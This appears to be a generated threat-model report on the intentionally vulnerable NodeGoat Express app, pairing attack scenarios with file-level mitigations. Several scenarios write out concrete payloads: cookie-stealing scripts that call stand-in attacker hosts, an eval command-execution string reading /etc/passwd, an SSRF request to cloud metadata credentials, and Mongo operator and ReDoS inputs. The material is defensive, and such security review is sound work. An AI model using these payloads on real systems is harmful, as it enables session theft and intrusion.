threats.title: Vulnerable express@4.16.4 allows open redirect and redirect-based XSS
threats.asset: user session cookies and rendered page content
threats.attackScenario: An attacker sends an employee a malformed URL against the NodeGoat server exploiting CVE-2024-29041/CVE-2024-43796 in express 4.16.4 (package.json:13), which is reachable through res.redirect in app/routes/index.js:72, causing the victim's browser to be redirected off-site or to execute script injected into the redirect response body and disclose the connect.sid session cookie.
threats.impactReason: Script execution in the application origin gives access to the session cookie and to the retirement and profile pages it can fetch.
threats.likelihoodReason: Public CVE with published details, and the app uses res.redirect with user-supplied input; exploitation still needs a victim to click a crafted URL.

mitigation.summary: Upgrade express to at least 4.20.0.
steps: Bump "express" in package.json from ^4.13.4 (resolved 4.16.4) to ^4.20.0 and regenerate the lockfile.
Re-run the dependency audit to confirm GHSA-rv95-896h-c2vc and GHSA-qw6h-vgh9-j6wx are cleared.

threats.title: Login attempts are logged without an auditable record of successful authentication and state changes
threats.asset: audit trail for logins and profile/contribution changes
threats.attackScenario: An attacker who has taken over a session updates bank details via POST /profile and contribution percentages via POST /contributions; the only logging in the request path is console.log of failed logins in app/routes/session.js:64 and console.error in app/routes/error.js, so no record ties the change to a source address or session and the victim cannot prove the change was not theirs.
assumptions: No external logging or audit middleware is attached outside the route files shown.
threats.impactReason: Fraudulent bank-detail and contribution changes cannot be attributed or reconstructed after the fact.
threats.likelihoodReason: Absence of audit records affects every state-changing request already reachable by any authenticated user.

mitigation.summary: Add structured audit logging for authentication and state-changing routes.
steps: Log successful and failed logins in app/routes/session.js with user id, source IP and timestamp, sanitising userName for CRLF as the comment at lines 66-80 describes.
Emit an audit record from handleProfileUpdate, handleContributionsUpdate, updateBenefits and addMemos containing the session user id and the fields changed.
Ship these logs off-host so a compromised app process cannot erase them.

threats.title: Stack traces and error internals returned to the browser by the error handler
threats.asset: internal file paths, Mongo driver errors and application structure
threats.attackScenario: An attacker triggers a handler failure (for example by posting a malformed userId to POST /benefits so BenefitsDAO calls back with an error) and app/routes/error.js:10-12 renders error-template with the whole err object, returning the stack trace and Mongo error text to the browser for use in planning further attacks.
assumptions: The error-template view prints the passed err object, including its stack, into the response body.
threats.impactReason: Leaks internal paths and driver detail that aid further attacks but no user records directly.
threats.likelihoodReason: Any logged-in user can provoke handler errors with malformed form fields.

mitigation.summary: Render a generic error page and log details server-side only.
steps: In app/routes/error.js pass only a static message to res.render and keep console.error for the stack.
Ensure app/views/error-template.html does not print err.stack.

threats.title: Insecure direct object reference on GET /allocations/:userId
threats.asset: other employees' retirement allocation records
threats.attackScenario: An attacker registers an account, notes their own numeric id in the /allocations/{{userId}} link rendered by app/views/layout.html:56, then requests GET /allocations/1, /allocations/2 and so on — app/routes/allocations.js:16-18 takes userId from req.params rather than req.session, so every other employee's stock, fund and bond allocations are returned.
assumptions: User ids are sequential integers assigned by the counters collection, so neighbouring ids are guessable.
threats.impactReason: The entire allocations collection is enumerable one id at a time, exposing every employee's retirement portfolio.
threats.likelihoodReason: Any self-registered user can walk sequential ids with a browser; no special position is needed.

mitigation.summary: Take the user id from the session instead of the URL parameter.
steps: Apply the commented fix at app/routes/allocations.js:12-15: read const { userId } = req.session and ignore req.params.userId.
If an admin view is required, add an explicit isAdmin middleware on the /allocations/:userId route in app/routes/index.js:63.

threats.title: ReDoS on POST /profile bank routing regex stalls the single-threaded event loop
threats.asset: availability of the NodeGoat Express server for all users
threats.attackScenario: A logged-in attacker submits POST /profile with bankRouting="11111111111111111111111111111111x"; the nested-quantifier regex /([0-9]+)+\#/ at app/routes/profile.js:59 backtracks catastrophically, pinning the Node event loop so that every other user's dashboard, login and contributions request hangs.
threats.impactReason: A single request can make the whole single-process Express server unresponsive to every user.
threats.likelihoodReason: Any registered user can post the field, and the payload is a short digit string.

mitigation.summary: Remove the nested quantifier from the bank routing validation.
steps: Change the pattern at app/routes/profile.js:59 to /^([0-9]+)#$/ as the comment on line 58 suggests.
Cap the length of bankRouting before running the regex.

threats.title: Unvalidated url parameter on /learn allows javascript:/data: scheme redirects
threats.asset: user browser navigation and any session data readable from a script executed in the application's origin context
threats.attackScenario: GET /learn at app/routes/index.js:70 performs no validation on the url query value, so an attacker supplies /learn?url=javascript:fetch('https://attacker.tld/?c='+document.cookie) or a data: URL and, on browsers that follow such Location values, script runs in the victim's context instead of a normal navigation.
assumptions: The victim's browser follows non-http schemes supplied in a Location header, which older or embedded browsers still do.
threats.impactReason: Script execution or a data-URL page rendered from a trusted link can steal the session cookie, which is not marked httpOnly in server.js.
threats.likelihoodReason: Most modern browsers block javascript: and data: in Location headers, so exploitation depends on the victim's client.

mitigation.summary: Validate the url parameter's scheme and host before redirecting.
steps: In app/routes/index.js:70, parse req.query.url with the WHATWG URL parser and reject anything whose protocol is not https:.
Reject values that do not resolve to a host on the destination allow-list, and return 400 rather than redirecting.

threats.title: Hardcoded express-session cookie secret allows forging of session cookies
threats.asset: session identifiers and the admin session (req.session.userId)
threats.attackScenario: config/env/all.js:8 defines `cookieSecret` as a literal in source, which server.js passes as the express-session `secret`, so an attacker who reads the public repository mints a validly signed connect.sid cookie for an arbitrary session and walks past isLoggedInMiddleware and isAdminUserMiddleware in app/routes/session.js:25-42 to reach admin-only pages and other users' records.
assumptions: The cookieSecret literal in config/env/all.js is the value used in the deployed environment and is not overridden by an environment variable at startup.
threats.impactReason: Forged signed session cookies grant authenticated and potentially admin access to accounts holding SSN, DOB and bank account numbers.
threats.likelihoodReason: The secret is committed to source, but the attacker must also guess or control a session id value that the store accepts.

mitigation.summary: Load the session secret from the environment and rotate the committed value.
steps: Replace the literal in config/env/all.js:8 with `process.env.COOKIE_SECRET` and fail startup if it is unset.
Generate a new high-entropy secret, deploy it via the environment, and invalidate existing sessions.
Remove the old secret from git history.

threats.title: Username enumeration via distinct login error messages on POST /login
threats.asset: valid account usernames
threats.attackScenario: handleLoginRequest in app/routes/session.js distinguishes `err.noSuchUser` (rendering "Invalid username") from `err.invalidPassword` (rendering the password-specific message), the distinction originating from the separate error flags set in validateLogin at app/data/user-dao.js:78-87, so an attacker POSTs a wordlist of usernames with a dummy password to /login and keeps every name whose response is the password error, building a confirmed account list for credential stuffing.
assumptions: The rendered login page text differs visibly between the two error branches as written in app/routes/session.js:82-92.
threats.impactReason: Confirmed usernames enable targeted credential stuffing against accounts holding SSN and bank details.
threats.likelihoodReason: POST /login is unauthenticated and the oracle is observable in the rendered page with no special position required.

mitigation.summary: Return one identical error for unknown-user and bad-password outcomes.
steps: In app/routes/session.js handleLoginRequest, render `errorMessage` ("Invalid username and/or password") for both the `err.noSuchUser` and `err.invalidPassword` branches.
Collapse the distinct error flags in app/data/user-dao.js validateLogin so callers cannot distinguish the two cases.

threats.title: Session-based auth guards leave no attributable record of authentication events
threats.asset: authentication audit trail for login, signup and logout
threats.attackScenario: The only record of authentication in app/routes/session.js is `console.log("Error: attempt to login with invalid user: ", userName)` with the raw, unencoded userName, and successful logins via POST /login, account creation via POST /signup and session destruction via GET /logout emit nothing, so an attacker who takes over an account performs actions with no timestamped, attributable log, and can additionally inject CRLF sequences in the userName field of a failed login to forge surrounding log lines.
assumptions: No reverse proxy or external access log records successful authentication events with the acting user id.
threats.impactReason: Account takeover and privilege abuse cannot be reconstructed or attributed after the fact.
threats.likelihoodReason: Any user of the unauthenticated /login endpoint controls the userName value that is logged unsanitised, and the absence of success logging is unconditional.

mitigation.summary: Emit structured, sanitised authentication audit events for login success/failure, signup and logout.
steps: In app/routes/session.js, log successful logins, signups and logouts with user id, timestamp and source IP through a structured logger rather than console.log.
Strip or encode CRLF from userName before logging at app/routes/session.js:64, e.g. `userName.replace(/(\r\n|\r|\n)/g, '_')`.
Ship the audit stream to append-only storage outside the application host.

threats.title: Missing CSRF protection lets an attacker drive state-changing DAO writes through the victim's session
threats.asset: user records written through the DAO layer (profile SSN, DOB, bank account and routing numbers, allocations and contributions)
threats.attackScenario: Cookie sessions are used and POST /login and the other state-changing routes are registered in app/routes/index.js with no CSRF middleware or token, so an attacker hosts a page that auto-submits a cross-site form to the application; the browser attaches connect.sid, the handler in app/routes/session.js passes the forged values into the DAO layer over the session-to-dao flow, and the victim's stored profile or allocation records are silently rewritten (or the victim is logged into the attacker's account by login CSRF).
assumptions: The session cookie is sent on cross-site POSTs because no SameSite attribute is configured on the express-session cookie.
threats.impactReason: Forged writes reach records holding SSN, DOB and bank account and routing numbers through the DAO layer.
threats.likelihoodReason: Any attacker-controlled page a logged-in user visits triggers the request; no credentials or network position are needed.

mitigation.summary: Enable CSRF tokens on all state-changing POST routes and set SameSite on the session cookie.
steps: Uncomment and enable the csurf middleware in server.js (lines 104-113) and expose res.locals.csrftoken to templates.
Add the hidden token field to the login, signup and profile forms in app/views.
Set `cookie: { sameSite: 'lax', httpOnly: true, secure: true }` on the express-session configuration in server.js.

threats.title: Absent security response headers allow injected script to read DAO-sourced data rendered in pages
threats.asset: profile data returned by the DAO layer (SSN, date of birth, bank account and routing numbers) rendered into responses
threats.attackScenario: express is configured in server.js with no helmet, no Content-Security-Policy and no frame or nosniff headers, so an attacker who lands any script into a rendered view (for example a memo body from MemosDAO.getAllMemos, rendered by swig with autoescape disabled) has no CSP to block execution or exfiltration and reads the profile fields that the session-to-dao flow returned into the same page, posting them to an attacker host.
assumptions: At least one DAO-sourced value is rendered into a view without escaping, so injected markup reaches the browser.
No reverse proxy adds Content-Security-Policy or X-Frame-Options in front of the Express app.
threats.impactReason: Exfiltrated fields include SSN, DOB and bank account and routing numbers for the viewing user.
threats.likelihoodReason: The headers are absent for every response, but the attacker still needs an injection sink or framing opportunity to profit from it.

mitigation.summary: Enable helmet with a restrictive Content-Security-Policy and re-enable template autoescaping.
steps: Uncomment and enable helmet in server.js (lines 10 and 38-65), configuring contentSecurityPolicy, frameguard, hsts and nosniff.
Set `autoescape: true` in the swig.setDefaults call in server.js:135-142 so DAO-sourced values are escaped before rendering.
Remove the x-powered-by header with app.disable("x-powered-by").

threats.title: Attacker redirects the /research outbound fetch to an arbitrary host (SSRF) by supplying the url parameter
threats.asset: internal-only HTTP services and cloud metadata reachable from the server
threats.attackScenario: app/routes/research.js:15 builds the fetch URL as req.query.url + req.query.symbol with no host allow-list, so an attacker requests GET /research?url=http://169.254.169.254/latest/meta-data/&symbol=iam/security-credentials/ and the server's needle.get response body is written straight back to the attacker at line 25, exposing internal endpoints in place of the intended finance.yahoo.com quote site.
threats.impactReason: The server-side fetch runs from inside the deployment network and the full response body is echoed to the caller, so internal services and instance metadata credentials are readable.
threats.likelihoodReason: The url parameter is a plain GET query value on an unauthenticated page and requires only editing the hidden form field.

mitigation.summary: Fix the outbound host in code and pass only an encoded symbol.
steps: In app/routes/research.js:15 stop reading req.query.url; hardcode the base https://finance.yahoo.com/quote/ constant.
Validate req.query.symbol against /^[A-Za-z.-]{1,10}$/ and encodeURIComponent it before concatenation.
Remove the hidden url input from app/views/research.html:17 so the client no longer supplies the host.

threats.title: Third-party response body from the /research fetch is written unescaped into the HTML response
threats.asset: the user's NodeGoat session cookie and rendered page content
threats.attackScenario: app/routes/research.js:25 writes the raw body returned by needle.get into a text/html response, so an attacker who controls or MITMs the fetched host sends back <script>fetch('//evil/'+document.cookie)</script> and it executes in the victim's browser on the application's own origin via GET /research?url=...&symbol=...
assumptions: The upstream host response is not sanitised anywhere else before res.write.
threats.impactReason: Script executes on the application origin, allowing session cookie theft and actions as the victim.
threats.likelihoodReason: The attacker fully controls the fetched host through the url parameter, so controlling the response body is trivial.

mitigation.summary: Never echo the upstream body as HTML; parse and render only the fields needed.
steps: In app/routes/research.js:24-26 extract the quote value and render it through the swig template app/views/research.html instead of res.write(body).
If raw content must be shown, escape it or serve it as Content-Type: text/plain.

threats.title: /research can be used to stall or exhaust the server by pointing the fetch at a slow or huge endpoint
threats.asset: availability of the Express request handlers and process memory
threats.attackScenario: needle.get at app/routes/research.js:16 is called with no timeout, size limit or allow-list, so an attacker issues repeated GET /research?url=http://slowloris.attacker.test/&symbol=x requests that each hold an outbound socket and buffer an unbounded body until the Node process runs out of sockets or memory.
assumptions: No reverse proxy imposes a per-request timeout or concurrency cap in front of the /research route.
threats.impactReason: Sustained requests tie up the single Node event loop and outbound sockets, degrading the whole application.
threats.likelihoodReason: The route is unauthenticated and the attacker fully controls the target host, but the attack needs sustained volume.

mitigation.summary: Bound the outbound request and restrict its destination.
steps: Pass { open_timeout: 3000, response_timeout: 5000, read_timeout: 5000 } to needle.get in app/routes/research.js:16.
Cap the accepted response size and abort beyond it.
Restrict the destination to the fixed finance.yahoo.com host so attacker-controlled slow endpoints cannot be targeted.

threats.title: Allocations request and response travel over plaintext HTTP across the browser-to-server trust boundary
threats.asset: session cookie and retirement allocation data in transit
threats.attackScenario: server.js:145 binds the app with http.createServer while the https block at server.js:149-155 stays commented out, so an attacker on the path between the browser and the server reads the connect.sid cookie sent with GET /allocations/:userId and rewrites the rendered allocations HTML in flight to inject script into the victim's session.
assumptions: No TLS-terminating reverse proxy sits in front of the Node process in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Both the session cookie and the user's allocation data are exposed, and responses can be modified before reaching the browser.
threats.likelihoodReason: Requires a network position between browser and server, which is realistic on shared Wi-Fi or an untrusted hop. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Terminate TLS for all traffic to the Express server and enable HSTS.
steps: Enable the commented https.createServer configuration in server.js:149-155 or front the app with a TLS-terminating proxy.
Redirect all plain HTTP requests to HTTPS.
Enable helmet.hsts() as the commented block at server.js:54 indicates, using the helmet dependency already in package.json.

threats.title: IDOR on GET /allocations/:userId lets any logged-in user read other employees' allocations
threats.asset: other employees' retirement allocation records (stocks, funds, bonds per userId)
threats.attackScenario: app/routes/allocations.js:16-18 takes userId from req.params instead of req.session and app/routes/index.js:63 only applies isLoggedIn, so an attacker signs up, logs in, and iterates GET /allocations/1, /allocations/2 ... to read every other employee's allocation records under their own session.
assumptions: User ids are the sequential integers produced by getNextSequence in app/data/user-dao.js and are therefore trivially enumerable.
threats.impactReason: Every user's retirement allocation data is readable one numeric id at a time.
threats.likelihoodReason: Any self-registered account reaches the route and ids are sequential integers.

mitigation.summary: Derive the allocations owner from the session rather than the URL parameter.
steps: In app/routes/allocations.js:16, replace `const { userId } = req.params;` with `const { userId } = req.session;` as the commented fix at lines 12-15 shows.
If cross-user viewing is required for admins, add sessionHandler.isAdminUserMiddleware to the route in app/routes/index.js:63.
Return 404 for ids outside the caller's scope so the endpoint does not confirm which users exist.

threats.title: No security response headers on allocations responses allow clickjacking and unrestricted script sources
threats.asset: retirement allocation data rendered in the user's browser
threats.attackScenario: No helmet or header middleware is registered for the Express app, so an attacker hosts a page that frames GET /allocations/:userId and overlays controls to trick a logged-in employee into acting on their allocations view, and any injected script in the rendered allocations page runs with no content security policy to block its exfiltration destination.
assumptions: No reverse proxy adds Content-Security-Policy, X-Frame-Options or X-Content-Type-Options to responses from this route.
threats.impactReason: Missing CSP and frame protections make injected script and UI-redress attacks against allocation data effective rather than contained.
threats.likelihoodReason: Any authenticated user's browser can be lured to an attacker page; no privileged position is needed.

mitigation.summary: Register helmet middleware so every response carries security headers.
steps: Uncomment the helmet require at server.js:10 and the header block at server.js:38-65, using the helmet dependency already declared in package.json:16.
Enable helmet.frameguard(), helmet.contentSecurityPolicy() and app.disable('x-powered-by') before routes(app, db) is called at server.js:132.
Define an explicit CSP script-src that excludes inline script.

threats.title: Unvalidated threshold query parameter on GET /allocations/:userId is passed straight into the allocations query
threats.asset: retirement allocation records in the allocations collection
threats.attackScenario: app/routes/allocations.js:19-23 reads req.query.threshold and hands it unchecked to allocationsDAO.getByUserIdAndThreshold, so a logged-in attacker requests GET /allocations/2?threshold[$gt]= or a threshold containing MongoDB operator syntax to alter the selection criteria and pull back allocation rows the query was meant to filter out.
assumptions: body-parser's extended:false setting does not prevent object-shaped values arriving via the query string, which Express parses separately.
getByUserIdAndThreshold in app/data/allocations-dao.js interpolates or embeds the threshold value into the Mongo query without casting it to a number.
threats.impactReason: Query manipulation exposes allocation rows beyond the intended threshold filter for the targeted userId.
threats.likelihoodReason: The parameter is directly attacker-controlled on a route any authenticated user can call, but exploitation depends on how the DAO builds the query.

mitigation.summary: Coerce and validate threshold to a bounded number before it reaches the DAO.
steps: In app/routes/allocations.js:19, parse threshold with Number() and reject NaN or out-of-range values with a 400 response.
In app/data/allocations-dao.js, build the query with a numeric comparison object rather than interpolating the raw value.
Reject non-string query values so object-shaped operators cannot be injected.

threats.title: No request size or rate limiting on the browser-to-server flow lets a single client exhaust the server
threats.asset: availability of the RetireEasy Express server for all employees
threats.attackScenario: With no rate limiter in front of the Express app, an attacker who has logged in loops GET /allocations/:userId?threshold=... at high volume, and separately posts oversized bodies to POST /profile where the backtracking regex /([0-9]+)+\#/ at app/routes/profile.js:59 pins the single Node event loop, making the dashboard unavailable to every other user.
assumptions: No rate limiting or request body size cap is applied in front of the Node process.
The application runs as a single Node process without a load balancer that sheds excess requests.
threats.impactReason: A single-threaded Node process serving all employees becomes unresponsive, denying access to contributions and allocations.
threats.likelihoodReason: Requires only a registered account and ordinary HTTP requests, though sustained traffic is needed.

mitigation.summary: Apply rate limiting and body size caps, and fix the catastrophic regex.
steps: Add an express rate-limit middleware in server.js before routes(app, db) at line 132, keyed by session id and IP.
Set a byte limit on bodyParser.json() and bodyParser.urlencoded() at server.js:71-75.
Replace the regex at app/routes/profile.js:59 with the non-backtracking /([0-9]+)\#/ shown in the comment at line 58.

threats.title: Any logged-in employee can rewrite another employee's benefit start date via POST /benefits
threats.asset: employee benefits data (benefit start dates for all non-admin users)
threats.attackScenario: A non-admin user who has logged in posts userId=2&benefitStartDate=2030-01-01 to POST /benefits; the route at app/routes/index.js:56 is guarded only by isLoggedIn (the isAdmin variant is commented out on lines 57-60) and app/routes/benefits.js:29-35 takes userId straight from req.body, so the attacker overwrites any employee's benefit start date while the response even renders with user.isAdmin true.
assumptions: The isAdmin middleware defined in app/routes/session.js is not applied to POST /benefits anywhere else in the request chain.
threats.impactReason: Benefit start dates for every non-admin employee can be altered, an integrity loss over HR records with financial consequences.
threats.likelihoodReason: Any account created through /signup reaches the route and the target userId is a plain body field with small integer values.

mitigation.summary: Require admin role on the benefits routes and validate the target userId.
steps: Apply the existing sessionHandler.isAdminUserMiddleware to both /benefits routes in app/routes/index.js:55-56, as the commented fix on lines 58-59 shows.
Validate that req.body.userId is an integer that exists in the non-admin user set before calling benefitsDAO.updateBenefits in app/routes/benefits.js:35.
Validate benefitStartDate against a date format before persisting.

threats.title: Cross-site request forgery on POST /benefits alters employee benefit dates
threats.asset: employee benefits data (benefit start dates)
threats.attackScenario: An attacker publishes a page that auto-submits a hidden form with userId and benefitStartDate fields to http://nodegoat/benefits; a logged-in employee who loads the page has their cookie session attached to the cross-site POST, and because no CSRF token is checked (csurf is commented out in server.js) the benefits record named by the attacker's userId is silently rewritten.
assumptions: The deployment does not rely on a SameSite cookie attribute or an edge filter that would block the cross-site POST.
threats.impactReason: Benefits records for arbitrary employees are tampered with without the acting user's knowledge or intent.
threats.likelihoodReason: Needs an authenticated victim to visit attacker content, but the request body needs no secret value.

mitigation.summary: Validate a CSRF token on POST /benefits.
steps: Enable the csurf middleware already present in package.json by uncommenting server.js lines 7 and 104-113.
Include the {{csrftoken}} hidden field in app/views/benefits.html's form.
Set SameSite on the session cookie in the express-session options in server.js.

threats.title: Missing security response headers let a framed or injected page drive POST /benefits
threats.asset: employee benefits data and the session cookie used to submit it
threats.attackScenario: With no helmet, CSP or X-Frame-Options set (helmet is imported but commented out in server.js line 10), an attacker frames the /benefits page on a lookalike site and overlays controls so a logged-in employee clicks through the benefit update form, submitting attacker-chosen userId and benefitStartDate values; the absent CSP also means any injected script on that page can read the rendered benefits data.
assumptions: No reverse proxy adds frame-ancestors or Content-Security-Policy headers in front of the Express server.
threats.impactReason: Clickjacked submissions tamper with benefits records and the missing CSP removes the last barrier against script injected into the benefits view.
threats.likelihoodReason: Framing works against any browser session with no special network position, though it requires luring an authenticated employee.

mitigation.summary: Enable helmet's frameguard, CSP and nosniff headers on the Express app.
steps: Uncomment the helmet require in server.js line 10 and the helmet block at lines 38-65, keeping frameguard, contentSecurityPolicy, hsts and app.disable('x-powered-by').
Define an explicit CSP with default-src 'self' rather than helmet's defaults.
Serve the app over HTTPS so hsts is meaningful.

threats.title: Cross-site request forgery forces a victim's contribution update and code execution on POST /contributions
threats.asset: the victim's retirement contribution percentages and, through eval(), the server process
threats.attackScenario: An attacker hosts a page that auto-submits a hidden form to http://nodegoat/contributions with preTax/afterTax/roth fields; because the session cookie is sent on the cross-site POST and no CSRF token is validated (csurf is commented out in server.js), a logged-in victim's visit silently rewrites their contribution percentages and delivers the attacker's string into the eval() calls at app/routes/contributions.js:32-34.
assumptions: No reverse proxy or SameSite cookie default blocks the cross-site POST for this deployment.
threats.impactReason: The forged request rides an authenticated session and reaches an eval() sink, so CSRF here escalates from data tampering to server-side code execution.
threats.likelihoodReason: Only requires luring an authenticated user to a page; the request needs no token and the body fields are simple form values.

mitigation.summary: Enable CSRF token validation for state-changing POST routes.
steps: Uncomment and mount the already-declared csurf middleware in server.js (lines 7 and 104-113) and expose res.locals.csrftoken to templates.
Add the hidden _csrf input to the contributions form view.
Set the session cookie to SameSite=Lax/Strict in the express-session cookie options in server.js.

threats.title: Session cookie carrying POST /contributions is exposed on plaintext HTTP
threats.asset: session cookie and the contribution values submitted by the user
threats.attackScenario: An attacker on the same network as a NodeGoat user captures the POST /contributions request, which server.js sends over http.createServer (line 145) with session cookie options commented out (no secure flag), reads the connect.sid cookie from the header and replays it to impersonate the victim and submit their own preTax/afterTax/roth values.
assumptions: No TLS-terminating proxy is placed in front of the Express server in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: A stolen session cookie gives full account takeover, including profile pages holding SSN and bank details.
threats.likelihoodReason: Requires a network position (shared Wi-Fi, hostile proxy) but no application-level skill once the traffic is visible. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS and mark session cookies secure and httpOnly.
steps: Enable the commented-out https.createServer block in server.js (lines 149-155) or terminate TLS at a proxy and set app.set('trust proxy', 1).
Uncomment the session cookie options in server.js (lines 92-100) and set httpOnly: true and secure: true.
Add HSTS via the already-declared helmet dependency.

threats.title: Server-side JavaScript injection via eval() on POST /contributions body fields
threats.asset: the NodeGoat Express server process and all data it can reach (profiles with SSN, bank account and routing numbers, contributions, memos)
threats.attackScenario: An attacker logs in, then posts the form field preTax with a value such as `require('child_process').execSync('cat /etc/passwd')` (or `while(1){}`) to POST /contributions; the handler passes req.body.preTax, afterTax and roth straight into eval() at app/routes/contributions.js:32-34, so the string runs as server-side JavaScript with the application's privileges and can read the Mongo connection string, dump the users collection or hang the single-threaded event loop.
threats.impactReason: Arbitrary code execution inside the Node process gives full read/write over the Mongo database (SSNs, bank accounts) and the host account running the server.
threats.likelihoodReason: Any self-registered, logged-in user can post the form field directly; no encoding or filtering stands between req.body and eval().

mitigation.summary: Replace eval() with numeric parsing of the contribution fields.
steps: Change app/routes/contributions.js:32-34 to `const preTax = parseInt(req.body.preTax, 10);` and the same for afterTax and roth, as the commented-out fix on lines 38-40 already shows.
Reject the request when Number.isNaN or the value is outside 0-30 before any DAO call.
Add a lint rule (no-eval) so eval cannot be reintroduced.

threats.title: Credentials replayed or brute-forced against POST /login because passwords are compared as plaintext with no throttling
threats.asset: user accounts and the stored user credentials in the MongoDB users collection
threats.attackScenario: app/data/user-dao.js:57-94 compares the submitted password to user.password with a plain string equality and addUser stores the password unhashed, so an attacker who reaches POST /login (app/routes/index.js:34) can run an unlimited credential-stuffing loop against the userName field, and the distinct 'Invalid username' vs invalid-password responses in app/routes/session.js:82-92 let them enumerate valid RetireEasy accounts first.
assumptions: No rate limiting or account lockout is applied in front of the POST /login route.
threats.impactReason: Successful guessing yields a session with access to SSN, DOB, bank account and routing numbers for the victim user.
threats.likelihoodReason: The login route is unauthenticated, reachable by anyone, and the differing error messages make username enumeration cheap.

mitigation.summary: Hash passwords and rate-limit login attempts, and return a single generic error.
steps: Enable the commented bcrypt.hashSync call in app/data/user-dao.js:29 and switch validateLogin to bcrypt.compareSync.
Return the identical errorMessage for both noSuchUser and invalidPassword branches in app/routes/session.js.
Add per-IP and per-account attempt throttling in front of app.post('/login') in app/routes/index.js:34.

threats.title: Cross-site request forgery against POST /login (login CSRF)
threats.asset: the victim's session cookie and the memos/contributions data recorded under the attacker-chosen account
threats.attackScenario: The csurf middleware is commented out in server.js:104-113 while express-session cookies are enabled, so an attacker hosts a page that auto-submits a form with userName and password fields to http://nodegoat/login (app/routes/index.js:34), silently logging the victim's browser into an attacker-controlled RetireEasy account so that any memo or contribution the victim then enters is written to the attacker's account.
assumptions: The session cookie is sent on cross-site form POSTs because no SameSite attribute is configured.
threats.impactReason: Data the victim subsequently enters is captured in the attacker's account, though existing victim data is not directly read.
threats.likelihoodReason: Requires luring an authenticated-capable user to an attacker page, but no other precondition exists since CSRF tokens are absent.

mitigation.summary: Re-enable CSRF protection for all state-changing form posts.
steps: Uncomment app.use(csrf()) and the res.locals.csrftoken middleware in server.js:104-113 using the csurf dependency already in package.json.
Add a hidden {{csrftoken}} input to app/views/login.html and the other POST forms.
Set sameSite: 'lax' on the session cookie in server.js:78.

threats.title: Login credentials and session cookie sent over plaintext HTTP on POST /login
threats.asset: user credentials (userName, password) and the express-session cookie
threats.attackScenario: server.js:145 starts the app with http.createServer and the HTTPS block at lines 149-155 is commented out, and the express-session cookie options (httpOnly/secure) at server.js:92-100 are also commented out, so an attacker on the same Wi-Fi as a RetireEasy user captures the POST /login body (app/routes/index.js:34) containing userName and password in clear text and replays the returned connect.sid cookie to take over the session.
assumptions: No TLS-terminating reverse proxy sits in front of the Express server in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: Cleartext credentials and session cookies give full access to profile data including SSN, DOB and bank account/routing numbers.
threats.likelihoodReason: Any network observer between browser and server can read the flow; no special privilege is required, though it does require network position. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the login flow only over HTTPS and harden the session cookie.
steps: Uncomment the https.createServer block in server.js (lines 149-155) or terminate TLS at a proxy and redirect all HTTP to HTTPS.
Set cookie: { httpOnly: true, secure: true, sameSite: 'lax' } in the express-session options at server.js:78.
Add HSTS via the already-declared helmet dependency in package.json.

threats.title: Cross-site request forgery posting memos as an authenticated victim
threats.asset: the shared memos collection displayed to all RetireEasy users
threats.attackScenario: csurf is commented out in server.js:104-113 and POST /memos (app/routes/index.js:67) only checks isLoggedIn, so an attacker lures a logged-in employee to a page that auto-submits a form with a memo field to /memos, writing an attacker-controlled memo (including the marked data-URI XSS payload) into the shared memo list under the victim's session.
assumptions: The session cookie is sent on cross-site form POSTs to /memos because no SameSite attribute is configured.
threats.impactReason: Lets an outsider plant content, including script payloads, in a list shown to every user, with attribution to the victim.
threats.likelihoodReason: Needs a logged-in victim to visit an attacker page, but there is no token to defeat once they do.

mitigation.summary: Require a CSRF token on POST /memos.
steps: Uncomment app.use(csrf()) in server.js:104 using the csurf dependency already declared in package.json.
Include the csrftoken hidden field in the memos form template.
Verify the token before memosDAO.insert runs in app/routes/memos.js:13.

threats.title: Memo text travels over plaintext HTTP alongside the session cookie
threats.asset: the session cookie carried on POST /memos
threats.attackScenario: The server listens with http.createServer at server.js:145 with the HTTPS block commented out, so an attacker sharing a network with a logged-in employee reads the POST /memos request (app/routes/index.js:67), lifts the connect.sid cookie from its headers, and replays it to reach /profile with the victim's SSN and bank account number.
assumptions: No TLS-terminating reverse proxy sits in front of the Express server in the deployed environment.
TLS is not terminated anywhere in front of the app, so credentials and cookies travel over plain HTTP as server.js configures.
threats.impactReason: A captured session cookie reaches profile data containing SSN, DOB and bank details.
threats.likelihoodReason: Requires network position on the path between browser and server, but no authentication or exploit is needed once there. Answer applied: no answer: the developer skipped or was unsure, so the cautious default applies.

mitigation.summary: Serve the application over HTTPS only and mark the session cookie secure.
steps: Enable the https.createServer block in server.js:149-155 or terminate TLS at a proxy and redirect HTTP to HTTPS.
Set cookie: { secure: true, httpOnly: true } in the session options at server.js:78.

threats.title: Stored XSS via POST /memos rendered by vulnerable marked 0.3.5 with swig autoescape disabled
threats.asset: session cookies and the personal profile data (SSN, DOB, bank account, routing number) reachable with a stolen session
threats.attackScenario: marked@0.3.5 is pinned at package.json:17 and is affected by CVE-2017-1000427, which allows script execution through data: URIs despite sanitize:true set at server.js:126, and swig autoescape is disabled at server.js:135-142, so an attacker posts a memo body such as [click](data:text/html;base64,<payload>) to POST /memos (app/routes/index.js:67) and every other logged-in user who loads /memos executes the attacker's script, which reads document.cookie and posts their /profile page contents to the attacker.
assumptions: Memo text stored by memosDAO.insert is rendered through app.locals.marked in the memos view for all users.
threats.impactReason: Memos are shown to every user via memosDAO.getAllMemos, so one post can hijack many sessions and expose SSN and bank details.
threats.likelihoodReason: Any registered user can post a memo and the vulnerable marked version bypasses the configured sanitizer.

mitigation.summary: Upgrade marked and stop rendering memo HTML unescaped.
steps: Bump marked to a current release in package.json (at minimum past 0.3.7) and run the install.
Set autoescape: true in the swig.setDefaults call at server.js:135.
Sanitise or reject data: and javascript: URIs in req.body.memo before memosDAO.insert in app/routes/memos.js:13.

threats.title: Unbounded memo body accepted on POST /memos exhausts server and database resources
threats.asset: availability of the NodeGoat Express server and the memos collection
